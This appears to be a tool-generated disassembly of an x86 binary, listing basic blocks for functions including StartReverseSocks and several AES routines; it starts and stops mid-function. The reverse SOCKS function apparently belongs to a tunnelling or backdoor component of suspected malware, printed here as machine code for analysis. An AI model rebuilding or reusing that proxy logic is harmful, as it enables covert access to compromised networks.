0x8053c1e:	mov	dword ptr [esp + 0x218], 5
0x8053c29:	mov	dword ptr [esp + 0x21c], 0
0x8053c34:	cld	
0x8053c35:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x8053d93:	jmp	0x8053de2
None
|
|
|
v
0x8053d2e:	add	esp, 0x14
0x8053d31:	push	8
0x8053d33:	lea	ebp, dword ptr [esp + 0x230]
0x8053d3a:	push	ebp
0x8053d3b:	push	2
0x8053d3d:	push	7
0x8053d3f:	push	esi
0x8053d40:	call	0x80521a4
None
|
|
|
v
0x8053dc7:	jmp	0x8053de2
None
|
|
|
v
0x8053da6:	add	esp, 0x10
0x8053da9:	inc	eax
0x8053daa:	je	0x8053dc9
None
|
|
|
v
0x8053db7:	pop	esi
0x8053db8:	pop	edi
0x8053db9:	push	dword ptr [ebx]
0x8053dbb:	push	dword ptr [esp + 0x234]
0x8053dc2:	call	0x8053a6c
None
|
|
|
v
0x8053c9f:	cmp	dword ptr [esp + 0x22c], 1
0x8053ca7:	lea	esi, dword ptr [esp + 8]
0x8053cab:	jne	0x8053cfa
None
|
|
|
v
0x8053d4e:	add	esp, 0xc
0x8053d51:	lea	edx, dword ptr [esp + 0x20c]
0x8053d58:	push	edx
0x8053d59:	push	eax
0x8053d5a:	push	edi
0x8053d5b:	call	0x804e020
None
|
|
|
v
0x8053c94:	add	esp, 0x10
0x8053c97:	test	eax, eax
0x8053c99:	jle	0x8053de5
None
|
|
|
v
0x8053c37:	mov	ecx, dword ptr [ebx]
0x8053c39:	mov	al, 1
0x8053c3b:	mov	edi, ecx
0x8053c3d:	shr	edi, 5
0x8053c40:	shl	eax, cl
0x8053c42:	inc	ecx
0x8053c43:	or	dword ptr [esp + edi*4 + 0x108], eax
0x8053c4a:	sub	esp, 0xc
0x8053c4d:	lea	eax, dword ptr [esp + 0x224]
0x8053c54:	push	eax
0x8053c55:	push	0
0x8053c57:	push	0
0x8053c59:	push	edx
0x8053c5a:	push	ecx
0x8053c5b:	call	0x804bc00
None
|
|
|
v
0x8053c6b:	mov	ecx, dword ptr [ebx]
0x8053c6d:	mov	eax, ecx
0x8053c6f:	cdq	
0x8053c70:	idiv	esi
0x8053c72:	mov	eax, dword ptr [esp + eax*4 + 0x108]
0x8053c79:	bt	eax, edx
0x8053c7c:	jae	0x8053de5
None
|
|
|
v
0x8053dc9:	push	eax
0x8053dca:	push	eax
0x8053dcb:	push	2
0x8053dcd:	push	dword ptr [ebx]
0x8053dcf:	call	0x8053bbe
None
|
|
|
v
0x8053dac:	push	ecx
0x8053dad:	push	ecx
0x8053dae:	push	3
0x8053db0:	push	dword ptr [ebx]
0x8053db2:	call	0x8053bbe
None
|
|
|
v
0x8053d95:	lea	edx, dword ptr [esp + 0x208]
0x8053d9c:	push	ebp
0x8053d9d:	push	0x10
0x8053d9f:	push	edx
0x8053da0:	push	eax
0x8053da1:	call	0x804bf80
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:StartReverseSocks
TOTAL BLOCKS :10
0x8053e53:	add	esp, 0x10
0x8053e56:	sub	esp, 0xc
0x8053e59:	lea	eax, dword ptr [esp + 0x2c]
0x8053e5d:	push	eax
0x8053e5e:	call	0x804f57c
None
|
|
|
v
0x8053e56:	sub	esp, 0xc
0x8053e59:	lea	eax, dword ptr [esp + 0x2c]
0x8053e5d:	push	eax
0x8053e5e:	call	0x804f57c
None
|
|
|
v
0x8053e47:	sub	esp, 0xc
0x8053e4a:	push	dword ptr [esp + 0x2c]
0x8053e4e:	call	0x804e827
None
|
|
|
v
0x8053e44:	add	esp, 0x10
0x8053e47:	sub	esp, 0xc
0x8053e4a:	push	dword ptr [esp + 0x2c]
0x8053e4e:	call	0x804e827
None
|
|
|
v
0x8053e30:	add	esp, 0x10
0x8053e33:	cmp	eax, 5
0x8053e36:	jne	0x8053e47
None
|
|
|
v
0x8053df0:	push	ebx
0x8053df1:	sub	esp, 0x20
0x8053df4:	mov	ebx, dword ptr [esp + 0x28]
0x8053df8:	push	dword ptr [ebx + 8]
0x8053dfb:	push	dword ptr [0x805b9cc]
0x8053e01:	call	0x804e859
None
|
|
|
v
0x8053e14:	mov	byte ptr [esp + 8], 3
0x8053e19:	mov	ecx, dword ptr [eax + 4]
0x8053e1c:	lea	edx, dword ptr [esp + 8]
0x8053e20:	mov	dword ptr [esp + 9], ecx
0x8053e24:	push	0
0x8053e26:	push	5
0x8053e28:	push	edx
0x8053e29:	push	dword ptr [eax]
0x8053e2b:	call	0x804bfe0
None
|
|
|
v
0x8053e38:	sub	esp, 0xc
0x8053e3b:	push	dword ptr [esp + 0x2c]
0x8053e3f:	call	0x8053be3
None
|
|
|
v
0x8053e06:	mov	dword ptr [ebx], eax
0x8053e08:	mov	eax, dword ptr [esp + 0x30]
0x8053e0c:	add	esp, 0x10
0x8053e0f:	cmp	dword ptr [eax], -1
0x8053e12:	je	0x8053e56
None
|
|
|
v
0x8053e63:	add	esp, 0x28
0x8053e66:	pop	ebx
0x8053e67:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:aes_mul_manual
TOTAL BLOCKS :7
0x8053e85:	xor	dx, 0x11b
0x8053e8a:	test	cl, cl
0x8053e8c:	jne	0x8053e75
None
|
|
|
v
0x8053e68:	mov	cl, byte ptr [esp + 8]
0x8053e6c:	xor	eax, eax
0x8053e6e:	movzx	edx, byte ptr [esp + 4]
0x8053e73:	jmp	0x8053e8a
None
|
|
|
v
0x8053e8a:	test	cl, cl
0x8053e8c:	jne	0x8053e75
None
|
|
|
v
0x8053e7c:	add	edx, edx
0x8053e7e:	shr	cl, 1
0x8053e80:	test	dh, 1
0x8053e83:	je	0x8053e8a
None
|
|
|
v
0x8053e8e:	ret	
None
|
|
|
v
0x8053e7a:	xor	eax, edx
0x8053e7c:	add	edx, edx
0x8053e7e:	shr	cl, 1
0x8053e80:	test	dh, 1
0x8053e83:	je	0x8053e8a
None
|
|
|
v
0x8053e75:	test	cl, 1
0x8053e78:	je	0x8053e7c
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:SubWord
TOTAL BLOCKS :1
0x8053e8f:	mov	edx, dword ptr [esp + 4]
0x8053e93:	mov	eax, edx
0x8053e95:	movzx	ecx, dl
0x8053e98:	shr	eax, 0x18
0x8053e9b:	movzx	ecx, byte ptr [ecx + 0x805c18c]
0x8053ea2:	movzx	eax, byte ptr [eax + 0x805c18c]
0x8053ea9:	shl	eax, 0x18
0x8053eac:	or	eax, ecx
0x8053eae:	movzx	ecx, dh
0x8053eb1:	and	edx, 0xff0000
0x8053eb7:	movzx	ecx, byte ptr [ecx + 0x805c18c]
0x8053ebe:	shr	edx, 0x10
0x8053ec1:	movzx	edx, byte ptr [edx + 0x805c18c]
0x8053ec8:	shl	ecx, 8
0x8053ecb:	or	eax, ecx
0x8053ecd:	shl	edx, 0x10
0x8053ed0:	or	eax, edx
0x8053ed2:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:RotateWord
TOTAL BLOCKS :1
0x8053ed3:	mov	edx, dword ptr [esp + 4]
0x8053ed7:	mov	eax, edx
0x8053ed9:	mov	ecx, edx
0x8053edb:	shl	eax, 8
0x8053ede:	and	edx, 0xff000000
0x8053ee4:	shr	eax, 0x10
0x8053ee7:	shl	ecx, 0x18
0x8053eea:	or	eax, ecx
0x8053eec:	shr	edx, 8
0x8053eef:	or	eax, edx
0x8053ef1:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:KeyExpansion
TOTAL BLOCKS :13
0x8053f1d:	push	ecx
0x8053f1e:	call	0x8053ed3
None
|
|
|
v
0x8053f5f:	push	ecx
0x8053f60:	call	0x8053e8f
None
|
|
|
v
0x8053f82:	pop	eax
0x8053f83:	pop	ebx
0x8053f84:	pop	esi
0x8053f85:	pop	edi
0x8053f86:	pop	ebp
0x8053f87:	ret	
None
|
|
|
v
0x8053f2b:	pop	ecx
0x8053f2c:	mov	ecx, eax
0x8053f2e:	xor	ecx, edi
0x8053f30:	test	edi, edi
0x8053f32:	je	0x8053f68
None
|
|
|
v
0x8053f34:	movzx	edx, byte ptr [edi + 0x805be8c]
0x8053f3b:	mov	edi, 0xff
0x8053f40:	movzx	eax, byte ptr [0x805be8e]
0x8053f47:	add	eax, edx
0x8053f49:	cdq	
0x8053f4a:	idiv	edi
0x8053f4c:	movzx	edi, byte ptr [edx + 0x805c08c]
0x8053f53:	jmp	0x8053f68
None
|
|
|
v
0x8053f5a:	cmp	edx, 4
0x8053f5d:	jne	0x8053f68
None
|
|
|
v
0x8053f68:	mov	eax, dword ptr [esp]
0x8053f6b:	xor	ecx, dword ptr [eax + ebx*4 + 0x18]
0x8053f6f:	mov	dword ptr [esi + ebx*4 + 0x18], ecx
0x8053f73:	inc	ebx
0x8053f74:	mov	eax, dword ptr [esi + 0x14]
0x8053f77:	lea	eax, dword ptr [eax*4 + 4]
0x8053f7e:	cmp	ebx, eax
0x8053f80:	jb	0x8053f0f
None
|
|
|
v
0x8053f23:	mov	dword ptr [esp], eax
0x8053f26:	call	0x8053e8f
None
|
|
|
v
0x8053ef2:	push	ebp
0x8053ef3:	push	edi
0x8053ef4:	mov	edi, 1
0x8053ef9:	push	esi
0x8053efa:	push	ebx
0x8053efb:	push	ebx
0x8053efc:	mov	esi, dword ptr [esp + 0x18]
0x8053f00:	mov	ebp, dword ptr [esi + 0x10]
0x8053f03:	imul	eax, ebp, -4
0x8053f06:	mov	ebx, ebp
0x8053f08:	add	eax, esi
0x8053f0a:	mov	dword ptr [esp], eax
0x8053f0d:	jmp	0x8053f74
None
|
|
|
v
0x8053f55:	cmp	ebp, 6
0x8053f58:	jle	0x8053f68
None
|
|
|
v
0x8053f65:	pop	edx
0x8053f66:	mov	ecx, eax
0x8053f68:	mov	eax, dword ptr [esp]
0x8053f6b:	xor	ecx, dword ptr [eax + ebx*4 + 0x18]
0x8053f6f:	mov	dword ptr [esi + ebx*4 + 0x18], ecx
0x8053f73:	inc	ebx
0x8053f74:	mov	eax, dword ptr [esi + 0x14]
0x8053f77:	lea	eax, dword ptr [eax*4 + 4]
0x8053f7e:	cmp	ebx, eax
0x8053f80:	jb	0x8053f0f
None
|
|
|
v
0x8053f0f:	xor	edx, edx
0x8053f11:	mov	eax, ebx
0x8053f13:	mov	ecx, dword ptr [esi + ebx*4 + 0x14]
0x8053f17:	div	ebp
0x8053f19:	test	edx, edx
0x8053f1b:	jne	0x8053f55
None
|
|
|
v
0x8053f74:	mov	eax, dword ptr [esi + 0x14]
0x8053f77:	lea	eax, dword ptr [eax*4 + 4]
0x8053f7e:	cmp	ebx, eax
0x8053f80:	jb	0x8053f0f
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:SubBytes
TOTAL BLOCKS :3
0x8053f8f:	mov	ebx, eax
0x8053f91:	mov	edx, eax
0x8053f93:	and	ebx, 3
0x8053f96:	inc	eax
0x8053f97:	sar	edx, 2
0x8053f9a:	lea	edx, dword ptr [edx + ebx*4]
0x8053f9d:	add	edx, ecx
0x8053f9f:	cmp	eax, 0x10
0x8053fa2:	movzx	ebx, byte ptr [edx]
0x8053fa5:	mov	bl, byte ptr [ebx + 0x805c18c]
0x8053fab:	mov	byte ptr [edx], bl
0x8053fad:	jne	0x8053f8f
None
|
|
|
v
0x8053faf:	pop	ebx
0x8053fb0:	ret	
None
|
|
|
v
0x8053f88:	push	ebx
0x8053f89:	mov	ecx, dword ptr [esp + 8]
0x8053f8d:	xor	eax, eax
0x8053f8f:	mov	ebx, eax
0x8053f91:	mov	edx, eax
0x8053f93:	and	ebx, 3
0x8053f96:	inc	eax
0x8053f97:	sar	edx, 2
0x8053f9a:	lea	edx, dword ptr [edx + ebx*4]
0x8053f9d:	add	edx, ecx
0x8053f9f:	cmp	eax, 0x10
0x8053fa2:	movzx	ebx, byte ptr [edx]
0x8053fa5:	mov	bl, byte ptr [ebx + 0x805c18c]
0x8053fab:	mov	byte ptr [edx], bl
0x8053fad:	jne	0x8053f8f
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ShiftRows
TOTAL BLOCKS :5
0x8053ff1:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x8053ff3:	add	esp, 0x10
0x8053ff6:	pop	ebx
0x8053ff7:	pop	esi
0x8053ff8:	pop	edi
0x8053ff9:	ret	
None
|
|
|
v
0x8053fe8:	mov	esi, esp
0x8053fea:	mov	ecx, 4
0x8053fef:	mov	edi, eax
0x8053ff1:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x8053fbd:	mov	ecx, edx
0x8053fbf:	mov	esi, edx
0x8053fc1:	and	ecx, 3
0x8053fc4:	inc	edx
0x8053fc5:	sar	esi, 2
0x8053fc8:	lea	edi, dword ptr [ecx*4]
0x8053fcf:	add	ecx, esi
0x8053fd1:	and	ecx, 3
0x8053fd4:	add	ecx, edi
0x8053fd6:	mov	cl, byte ptr [eax + ecx]
0x8053fd9:	lea	ebx, dword ptr [esp + 0x10]
0x8053fdd:	add	ebx, edi
0x8053fdf:	cmp	edx, 0x10
0x8053fe2:	mov	byte ptr [esi + ebx - 0x10], cl
0x8053fe6:	jne	0x8053fbd
None
|
|
|
v
0x8053fb1:	push	edi
0x8053fb2:	xor	edx, edx
0x8053fb4:	push	esi
0x8053fb5:	push	ebx
0x8053fb6:	sub	esp, 0x10
0x8053fb9:	mov	eax, dword ptr [esp + 0x20]
0x8053fbd:	mov	ecx, edx
0x8053fbf:	mov	esi, edx
0x8053fc1:	and	ecx, 3
0x8053fc4:	inc	edx
0x8053fc5:	sar	esi, 2
0x8053fc8:	lea	edi, dword ptr [ecx*4]
0x8053fcf:	add	ecx, esi
0x8053fd1:	and	ecx, 3
0x8053fd4:	add	ecx, edi
0x8053fd6:	mov	cl, byte ptr [eax + ecx]
0x8053fd9:	lea	ebx, dword ptr [esp + 0x10]
0x8053fdd:	add	ebx, edi
0x8053fdf:	cmp	edx, 0x10
0x8053fe2:	mov	byte ptr [esi + ebx - 0x10], cl
0x8053fe6:	jne	0x8053fbd
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:MixColumns
TOTAL BLOCKS :21
0x8053ffa:	push	ebp
0x8053ffb:	xor	ecx, ecx
0x8053ffd:	push	edi
0x8053ffe:	push	esi
0x8053fff:	push	ebx
0x8054000:	sub	esp, 0x24
0x8054003:	movzx	esi, byte ptr [0x805be8e]
0x805400a:	movzx	edi, byte ptr [0x805be8f]
0x8054011:	mov	ebx, dword ptr [esp + 0x38]
0x8054015:	mov	dword ptr [esp + 0xc], esi
0x8054019:	mov	dword ptr [esp + 0x10], edi
0x805401d:	mov	al, byte ptr [ebx]
0x805401f:	xor	esi, esi
0x8054021:	test	al, al
0x8054023:	mov	byte ptr [esp + 9], al
0x8054027:	je	0x8054046
None
|
|
|
v
0x8054101:	movzx	eax, dl
0x8054104:	mov	esi, 0xff
0x8054109:	movzx	eax, byte ptr [eax + 0x805be8c]
0x8054110:	add	eax, dword ptr [esp + 0xc]
0x8054114:	cdq	
0x8054115:	mov	dword ptr [esp + 4], eax
0x8054119:	idiv	esi
0x805411b:	mov	al, byte ptr [edx + 0x805c08c]
0x8054121:	xor	al, byte ptr [esp + 0xa]
0x8054125:	mov	edx, ebp
0x8054127:	mov	byte ptr [esp + 0xa], al
0x805412b:	xor	eax, eax
0x805412d:	test	dl, dl
0x805412f:	je	0x8054151
None
|
|
|
v
0x8054053:	movzx	eax, al
0x8054056:	mov	edi, 0xff
0x805405b:	movzx	eax, byte ptr [eax + 0x805be8c]
0x8054062:	add	eax, dword ptr [esp + 0x10]
0x8054066:	cdq	
0x8054067:	idiv	edi
0x8054069:	mov	dl, byte ptr [edx + 0x805c08c]
0x805406f:	movzx	ebp, byte ptr [ebx + 0xc]
0x8054073:	movzx	edi, byte ptr [ebx + 8]
0x8054077:	mov	byte ptr [esp + 0xa], 0
0x805407c:	mov	eax, ebp
0x805407e:	xor	eax, edi
0x8054080:	xor	eax, esi
0x8054082:	xor	eax, edx
0x8054084:	cmp	byte ptr [esp + 0xb], 0
0x8054089:	mov	byte ptr [esp + ecx + 0x14], al
0x805408d:	je	0x80540b5
None
|
|
|
v
0x80541c4:	mov	edi, dword ptr [esp + 0x38]
0x80541c8:	mov	esi, eax
0x80541ca:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x80540dd:	mov	al, byte ptr [esp + 9]
0x80540e1:	xor	eax, ebp
0x80540e3:	xor	al, byte ptr [esp + 0xa]
0x80540e7:	xor	eax, edx
0x80540e9:	mov	dl, byte ptr [esp + 0xb]
0x80540ed:	xor	dl, byte ptr [esp + 9]
0x80540f1:	mov	byte ptr [esp + ecx + 0x18], al
0x80540f5:	xor	eax, eax
0x80540f7:	mov	byte ptr [esp + 0xa], dl
0x80540fb:	mov	edx, edi
0x80540fd:	test	dl, dl
0x80540ff:	je	0x8054121
None
|
|
|
v
0x80541ca:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x8054121:	xor	al, byte ptr [esp + 0xa]
0x8054125:	mov	edx, ebp
0x8054127:	mov	byte ptr [esp + 0xa], al
0x805412b:	xor	eax, eax
0x805412d:	test	dl, dl
0x805412f:	je	0x8054151
None
|
|
|
v
0x80541af:	xor	edx, edi
0x80541b1:	inc	ebx
0x80541b2:	mov	byte ptr [esp + ecx + 0x20], dl
0x80541b6:	inc	ecx
0x80541b7:	cmp	ecx, 4
0x80541ba:	lea	eax, dword ptr [esp + 0x14]
0x80541be:	jne	0x805401d
None
|
|
|
v
0x805406f:	movzx	ebp, byte ptr [ebx + 0xc]
0x8054073:	movzx	edi, byte ptr [ebx + 8]
0x8054077:	mov	byte ptr [esp + 0xa], 0
0x805407c:	mov	eax, ebp
0x805407e:	xor	eax, edi
0x8054080:	xor	eax, esi
0x8054082:	xor	eax, edx
0x8054084:	cmp	byte ptr [esp + 0xb], 0
0x8054089:	mov	byte ptr [esp + ecx + 0x14], al
0x805408d:	je	0x80540b5
None
|
|
|
v
0x80540b5:	mov	eax, edi
0x80540b7:	xor	edx, edx
0x80540b9:	test	al, al
0x80540bb:	je	0x80540dd
None
|
|
|
v
0x8054151:	xor	al, byte ptr [esp + 0xa]
0x8054155:	mov	byte ptr [esp + ecx + 0x1c], al
0x8054159:	xor	eax, eax
0x805415b:	cmp	byte ptr [esp + 9], 0
0x8054160:	je	0x8054180
None
|
|
|
v
0x8054029:	movzx	eax, al
0x805402c:	mov	esi, 0xff
0x8054031:	movzx	eax, byte ptr [eax + 0x805be8c]
0x8054038:	add	eax, dword ptr [esp + 0xc]
0x805403c:	cdq	
0x805403d:	idiv	esi
0x805403f:	movzx	esi, byte ptr [edx + 0x805c08c]
0x8054046:	mov	al, byte ptr [ebx + 4]
0x8054049:	xor	edx, edx
0x805404b:	test	al, al
0x805404d:	mov	byte ptr [esp + 0xb], al
0x8054051:	je	0x805406f
None
|
|
|
v
0x8054131:	movzx	eax, dl
0x8054134:	mov	esi, 0xff
0x8054139:	movzx	eax, byte ptr [eax + 0x805be8c]
0x8054140:	add	eax, dword ptr [esp + 0x10]
0x8054144:	cdq	
0x8054145:	mov	dword ptr [esp + 4], eax
0x8054149:	idiv	esi
0x805414b:	mov	al, byte ptr [edx + 0x805c08c]
0x8054151:	xor	al, byte ptr [esp + 0xa]
0x8054155:	mov	byte ptr [esp + ecx + 0x1c], al
0x8054159:	xor	eax, eax
0x805415b:	cmp	byte ptr [esp + 9], 0
0x8054160:	je	0x8054180
None
|
|
|
v
0x805401d:	mov	al, byte ptr [ebx]
0x805401f:	xor	esi, esi
0x8054021:	test	al, al
0x8054023:	mov	byte ptr [esp + 9], al
0x8054027:	je	0x8054046
None
|
|
|
v
0x8054180:	mov	dl, byte ptr [esp + 0xb]
0x8054184:	xor	edi, edx
0x8054186:	xor	edx, edx
0x8054188:	xor	edi, eax
0x805418a:	mov	eax, ebp
0x805418c:	test	al, al
0x805418e:	je	0x80541af
None
|
|
|
v
0x8054046:	mov	al, byte ptr [ebx + 4]
0x8054049:	xor	edx, edx
0x805404b:	test	al, al
0x805404d:	mov	byte ptr [esp + 0xb], al
0x8054051:	je	0x805406f
None
|
|
|
v
0x8054190:	and	ebp, 0xff
0x8054196:	mov	esi, 0xff
0x805419b:	movzx	eax, byte ptr [ebp + 0x805be8c]
0x80541a2:	add	eax, dword ptr [esp + 0xc]
0x80541a6:	cdq	
0x80541a7:	idiv	esi
0x80541a9:	mov	dl, byte ptr [edx + 0x805c08c]
0x80541af:	xor	edx, edi
0x80541b1:	inc	ebx
0x80541b2:	mov	byte ptr [esp + ecx + 0x20], dl
0x80541b6:	inc	ecx
0x80541b7:	cmp	ecx, 4
0x80541ba:	lea	eax, dword ptr [esp + 0x14]
0x80541be:	jne	0x805401d
None
|
|
|
v
0x805408f:	movzx	eax, byte ptr [esp + 0xb]
0x8054094:	mov	esi, 0xff
0x8054099:	movzx	eax, byte ptr [eax + 0x805be8c]
0x80540a0:	add	eax, dword ptr [esp + 0xc]
0x80540a4:	cdq	
0x80540a5:	mov	dword ptr [esp + 4], eax
0x80540a9:	idiv	esi
0x80540ab:	mov	al, byte ptr [edx + 0x805c08c]
0x80540b1:	mov	byte ptr [esp + 0xa], al
0x80540b5:	mov	eax, edi
0x80540b7:	xor	edx, edx
0x80540b9:	test	al, al
0x80540bb:	je	0x80540dd
None
|
|
|
v
0x8054162:	movzx	esi, byte ptr [esp + 9]
0x8054167:	movzx	eax, byte ptr [esi + 0x805be8c]
0x805416e:	mov	esi, 0xff
0x8054173:	add	eax, dword ptr [esp + 0x10]
0x8054177:	cdq	
0x8054178:	idiv	esi
0x805417a:	mov	al, byte ptr [edx + 0x805c08c]
0x8054180:	mov	dl, byte ptr [esp + 0xb]
0x8054184:	xor	edi, edx
0x8054186:	xor	edx, edx
0x8054188:	xor	edi, eax
0x805418a:	mov	eax, ebp
0x805418c:	test	al, al
0x805418e:	je	0x80541af
None
|
|
|
v
0x80540bd:	movzx	eax, al
0x80540c0:	mov	esi, 0xff
0x80540c5:	movzx	eax, byte ptr [eax + 0x805be8c]
0x80540cc:	add	eax, dword ptr [esp + 0x10]
0x80540d0:	cdq	
0x80540d1:	mov	dword ptr [esp + 4], eax
0x80540d5:	idiv	esi
0x80540d7:	mov	dl, byte ptr [edx + 0x805c08c]
0x80540dd:	mov	al, byte ptr [esp + 9]
0x80540e1:	xor	eax, ebp
0x80540e3:	xor	al, byte ptr [esp + 0xa]
0x80540e7:	xor	eax, edx
0x80540e9:	mov	dl, byte ptr [esp + 0xb]
0x80540ed:	xor	dl, byte ptr [esp + 9]
0x80540f1:	mov	byte ptr [esp + ecx + 0x18], al
0x80540f5:	xor	eax, eax
0x80540f7:	mov	byte ptr [esp + 0xa], dl
0x80540fb:	mov	edx, edi
0x80540fd:	test	dl, dl
0x80540ff:	je	0x8054121
None
|
|
|
v
0x80541cc:	add	esp, 0x24
0x80541cf:	pop	ebx
0x80541d0:	pop	esi
0x80541d1:	pop	edi
0x80541d2:	pop	ebp
0x80541d3:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:AddRoundKey
TOTAL BLOCKS :3
0x80541e5:	mov	edx, eax
0x80541e7:	mov	edi, eax
0x80541e9:	and	edx, 3
0x80541ec:	inc	eax
0x80541ed:	sar	edi, 2
0x80541f0:	lea	ecx, dword ptr [edx*8]
0x80541f7:	lea	esi, dword ptr [edi + edx*4]
0x80541fa:	mov	edx, 0xff
0x80541ff:	lea	edi, dword ptr [edi + ebp + 4]
0x8054203:	shl	edx, cl
0x8054205:	and	edx, dword ptr [ebx + edi*4 + 8]
0x8054209:	shr	edx, cl
0x805420b:	xor	byte ptr [ebx + esi], dl
0x805420e:	cmp	eax, 0x10
0x8054211:	jne	0x80541e5
None
|
|
|
v
0x80541d4:	push	ebp
0x80541d5:	xor	eax, eax
0x80541d7:	push	edi
0x80541d8:	push	esi
0x80541d9:	push	ebx
0x80541da:	mov	ebp, dword ptr [esp + 0x18]
0x80541de:	mov	ebx, dword ptr [esp + 0x14]
0x80541e2:	shl	ebp, 2
0x80541e5:	mov	edx, eax
0x80541e7:	mov	edi, eax
0x80541e9:	and	edx, 3
0x80541ec:	inc	eax
0x80541ed:	sar	edi, 2
0x80541f0:	lea	ecx, dword ptr [edx*8]
0x80541f7:	lea	esi, dword ptr [edi + edx*4]
0x80541fa:	mov	edx, 0xff
0x80541ff:	lea	edi, dword ptr [edi + ebp + 4]
0x8054203:	shl	edx, cl
0x8054205:	and	edx, dword ptr [ebx + edi*4 + 8]
0x8054209:	shr	edx, cl
0x805420b:	xor	byte ptr [ebx + esi], dl
0x805420e:	cmp	eax, 0x10
0x8054211:	jne	0x80541e5
None
|
|
|
v
0x8054213:	pop	ebx
0x8054214:	pop	esi
0x8054215:	pop	edi
0x8054216:	pop	ebp
0x8054217:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:InverseShiftRows
TOTAL BLOCKS :5
0x8054258:	add	esp, 0x10
0x805425b:	pop	ebx
0x805425c:	pop	esi
0x805425d:	pop	edi
0x805425e:	pop	ebp
0x805425f:	ret	
None
|
|
|
v
0x8054256:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x8054218:	push	ebp
0x8054219:	xor	edx, edx
0x805421b:	push	edi
0x805421c:	push	esi
0x805421d:	push	ebx
0x805421e:	sub	esp, 0x10
0x8054221:	mov	eax, dword ptr [esp + 0x24]
0x8054225:	mov	edi, edx
0x8054227:	mov	esi, edx
0x8054229:	and	edi, 3
0x805422c:	inc	edx
0x805422d:	sar	esi, 2
0x8054230:	lea	ecx, dword ptr [esi + edi]
0x8054233:	shl	edi, 2
0x8054236:	and	ecx, 3
0x8054239:	add	esi, edi
0x805423b:	mov	bl, byte ptr [eax + esi]
0x805423e:	lea	ebp, dword ptr [esp + 0x10]
0x8054242:	add	ebp, edi
0x8054244:	cmp	edx, 0x10
0x8054247:	mov	byte ptr [ecx + ebp - 0x10], bl
0x805424b:	jne	0x8054225
None
|
|
|
v
0x8054225:	mov	edi, edx
0x8054227:	mov	esi, edx
0x8054229:	and	edi, 3
0x805422c:	inc	edx
0x805422d:	sar	esi, 2
0x8054230:	lea	ecx, dword ptr [esi + edi]
0x8054233:	shl	edi, 2
0x8054236:	and	ecx, 3
0x8054239:	add	esi, edi
0x805423b:	mov	bl, byte ptr [eax + esi]
0x805423e:	lea	ebp, dword ptr [esp + 0x10]
0x8054242:	add	ebp, edi
0x8054244:	cmp	edx, 0x10
0x8054247:	mov	byte ptr [ecx + ebp - 0x10], bl
0x805424b:	jne	0x8054225
None
|
|
|
v
0x805424d:	mov	esi, esp
0x805424f:	mov	ecx, 4
0x8054254:	mov	edi, eax
0x8054256:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:InverseSubBytes
TOTAL BLOCKS :3
0x8054267:	mov	ebx, eax
0x8054269:	mov	edx, eax
0x805426b:	and	ebx, 3
0x805426e:	inc	eax
0x805426f:	sar	edx, 2
0x8054272:	lea	edx, dword ptr [edx + ebx*4]
0x8054275:	add	edx, ecx
0x8054277:	cmp	eax, 0x10
0x805427a:	movzx	ebx, byte ptr [edx]
0x805427d:	mov	bl, byte ptr [ebx + 0x805bf8c]
0x8054283:	mov	byte ptr [edx], bl
0x8054285:	jne	0x8054267
None
|
|
|
v
0x8054287:	pop	ebx
0x8054288:	ret	
None
|
|
|
v
0x8054260:	push	ebx
0x8054261:	mov	ecx, dword ptr [esp + 8]
0x8054265:	xor	eax, eax
0x8054267:	mov	ebx, eax
0x8054269:	mov	edx, eax
0x805426b:	and	ebx, 3
0x805426e:	inc	eax
0x805426f:	sar	edx, 2
0x8054272:	lea	edx, dword ptr [edx + ebx*4]
0x8054275:	add	edx, ecx
0x8054277:	cmp	eax, 0x10
0x805427a:	movzx	ebx, byte ptr [edx]
0x805427d:	mov	bl, byte ptr [ebx + 0x805bf8c]
0x8054283:	mov	byte ptr [edx], bl
0x8054285:	jne	0x8054267
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:InverseMixColumns
TOTAL BLOCKS :37
0x80543b7:	movzx	eax, byte ptr [esp + 2]
0x80543bc:	movzx	eax, byte ptr [eax + 0x805be8c]
0x80543c3:	add	eax, dword ptr [esp + 8]
0x80543c7:	cdq	
0x80543c8:	idiv	ecx
0x80543ca:	mov	al, byte ptr [edx + 0x805c08c]
0x80543d0:	xor	esi, eax
0x80543d2:	xor	eax, eax
0x80543d4:	cmp	byte ptr [esp + 3], 0
0x80543d9:	je	0x80543f4
None
|
|
|
v
0x80543d0:	xor	esi, eax
0x80543d2:	xor	eax, eax
0x80543d4:	cmp	byte ptr [esp + 3], 0
0x80543d9:	je	0x80543f4
None
|
|
|
v
0x80543f4:	xor	eax, esi
0x80543f6:	xor	esi, esi
0x80543f8:	test	bl, bl
0x80543fa:	mov	byte ptr [esp + ebp + 0x18], al
0x80543fe:	je	0x8054418
None
|
|
|
v
0x80544c8:	xor	esi, ebx
0x80544ca:	xor	ebx, ebx
0x80544cc:	cmp	byte ptr [esp + 2], 0
0x80544d1:	je	0x80544ec
None
|
|
|
v
0x8054393:	movzx	eax, byte ptr [esp + 1]
0x8054398:	movzx	eax, byte ptr [eax + 0x805be8c]
0x805439f:	add	eax, dword ptr [esp + 4]
0x80543a3:	cdq	
